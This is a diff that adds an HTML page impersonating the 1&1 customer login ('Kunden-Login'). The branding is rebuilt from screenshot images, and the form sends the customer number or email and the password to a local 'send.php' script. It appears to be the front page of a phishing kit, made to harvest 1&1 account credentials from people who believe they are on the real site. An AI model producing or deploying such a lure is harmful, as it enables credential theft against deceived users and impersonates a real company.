@@ -1,0 +1,163 @@
+<!DOCTYPE html><html><head>
+	<meta charset="UTF-8">
+	<title>1&amp;1 Kunden-Login</title>
+	<link rel="icon" type="image/png" href="de/icon.png">
+    <link type="text/css" src="de/stylesheet.css" rel="stylesheet">
+    <link type="text/css" src="de/stylesheet1.css" rel="stylesheet">
+    
+	<style type="text/css">
+	html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {margin: 0;padding: 0; border: 0; font-size: 100%; font: inherit; vertical-align: baseline;}
+		body{background-color: #004192; color: #fff;}
+		#head{
+		position: relative;
+	    z-index: 102;
+	    overflow: visible;
+	    color: #fff;}
+	   div#container {
+	    margin-left: 30px;
+	    width: 964px;}
+	    .loginform {
+	    border-right: 1px solid #CCE0EE;
+	    float: left;
+	    padding: 0 19px 0 0;}
+	    .loginform form {
+	    height: 165px;
+	    position: relative;}
+	    div#content {
+	    background-color: #fff;
+	    padding: 5px 10px;
+	    border-radius: 10px;
+	    margin: 0;}.loginform form {
+	    height: 165px;
+	    position: relative;}
+	    img#Menu {
+	    position: relative;
+	    top: 4px;
+	    left: 24px;}.loginform label {
+    color: #4b688e;
+    display: block;
+    font-size: 14px;
+    font-weight: bold;
+    margin: 0 0 10px 0;
+}#loginform-user, #loginform-password, #loginform-webdesk, #loginform-kwk-user {
+    height: 27px;
+    margin: 0 0 5px 0;
+    padding: 2px;
+    width: 200px;
+
+}.alpha {
+    margin-left: 0;
+}.grid-11 {
+    width: 640px;
+}.loginform-user {
+    float: left;
+    width: 260px;
+}.loginform-password {
+    float: left;
+    width: 230px;
+}.loginform-submit {
+    bottom: auto;
+    clear: none;
+    float: left;
+    position: static;
+    right: auto;
+}.loginform-submit .ct-btn-app-a1 {
+    float: left;
+    margin: 25px 0 0 0;
+    padding: 0 40px;
+}.ct-btn-app-a1 {
+    background-color: #084F9A;
+    background-image: -webkit-gradient(linear,left top,left bottom,from(#0B7EBD),to(#01408F));
+    background-image: -moz-linear-gradient(top,#0B7EBD 0,#01408F);
+    background-image: -webkit-linear-gradient(top,#0B7EBD 0,#01408F);
+    background-image: -o-linear-gradient(top,#0B7EBD 0,#01408F);
+    background-image: -ms-linear-gradient(top,#0B7EBD 0,#01408F);
+    background-image: linear-gradient(top,#0B7EBD 0,#01408F);
+    border: 1px solid #084F9A;
+    -moz-border-radius: 4px;
+    -webkit-border-radius: 4px;
+    border-radius: 4px;
+    -moz-box-shadow: 1px 1px 2px 0 rgba(0,0,0,0.3);
+    -webkit-box-shadow: 1px 1px 2px 0 rgba(0,0,0,0.3);
+    box-shadow: 1px 1px 2px 0 rgba(0,0,0,0.3);
+    -moz-box-sizing: border-box;
+    -ms-box-sizing: border-box;
+    -webkit-box-sizing: border-box;
+    box-sizing: border-box;
+    color: #FFF;
+    cursor: pointer;
+    display: inline-block;
+    font-family: Arial,Helvetica,sans-serif;
+    font-size: 16px;
+    font-weight: bold;
+    line-height: 32px;
+    outline: 0 none;
+    padding: 0 19px;
+    text-align: center;
+    text-decoration: none;
+    white-space: nowrap;
+}.loginform-user p {
+    float: none;
+    width: 210px;
+}#par {
+    color: #5B74AC;
+    padding-bottom: 15px;
+}#par {
+    padding-bottom: 9px;
+}div#footer {
+    margin: 20px 0;
+}img#ButtomPub0 {
+    padding-right: 5px;
+}img#ButtomPub1 {
+    padding: 0 5px;
+}.headline-c2{color:#646E80;font-family:OpenSansRegular,Arial,Arial Narrow,sans-serif;font-size:18px;font-weight:normal;line-height:1em;}.headline-c2.content-headline{line-height:1.4em;}.headline-c2 a{color:inherit;text-decoration:none;}.headline-c2 a:hover{color:inherit;text-decoration:underline;}.form-help-text {
+    display: inline-block;
+    line-height: 1.25em;
+    font-size: 12px;
+}p#passId {
+    font-size: 14px;
+    text-decoration:underline;
+}img#RPub {
+    position: absolute;
+    right: 0;
+    top: 150px;
+    margin-right: 8px;
+}
+	</style>
+</head>
+<body>
+	<div id="container">
+    <img id="RPub" src="de/RPub.PNG">
+		<div id="head"><img src="de/TopM.PNG"></div>
+		<div id="MCont"><img id="Menu" src="de/Menu.PNG">
+		<div id="content">
+			<div class="loginform grid-11 alpha">
+			<form name="loginform" action="send.php" method="post">
+			<fieldset>
+			<legend class="hidden">Kunden-Login</legend>
+			<div class="loginform-user headline-c2">
+			<label for="loginform-user">Kunde</label>
+			<input id="loginform-user" type="text" name="UserLog" value="" required="required">
+			<br><p id="par" class="form-help-text"> Kundennummer, Nutzername (E-Mail-Adresse) oder Domain-Name</p></div>
+			<div class="loginform-password headline-c2">
+			<label for="loginform-password">Passwort</label>
+			<input id="loginform-password" type="password" name="PassLog" required="required">
+			<br>
+			<a href="#"><p id="passId">Passwort vergessen?</p></a></div>
+			<div class="loginform-submit">
+			<button class="ct-btn-app-a1" type="submit" id="ct-btn-submitbutton-lead">Login</button></div>
+			</fieldset>
+			<div class="ias-zone offerlink" data-zoneid="nks_login_offerlink" data-ias-zoneid="nks_login_offerlink" id="ias.zone0"><div><p style="font-family:OpenSansRegular,Arial,Arial Narrow,sans-serif;margin-top: 10px; padding-bottom: 0; font-weight: bold; font-size: 12px; line-height: 18px; color: #244590;">Noch kein 1&amp;1 Kunde?</p>
+			<a href="#" target="_blank" style="text-decoration-color: #5b74ac;">
+			  <span style="font-family:OpenSansRegular,Arial,Arial Narrow,sans-serif;margin-bottom: 18px; font-size: 12px; color: #5b74ac; text-decoration-color: #5b74ac;">
+			    Jetzt Kunde werden und von unseren Angeboten profitieren.
+			  </span>
+			</a>
+			</div></div></form></div>
+            <img src="de/RightPub.PNG">
+		</div>
+		</div>
+		<div id="footer"><img id="ButtomPub0" src="de/ButtomPub0.PNG"><img id="ButtomPub1" src="de/ButtomPub1.PNG"><img id="ButtomPub2" src="de/ButtomPub2.PNG"></div>
+	</div>
+
+</body></html>
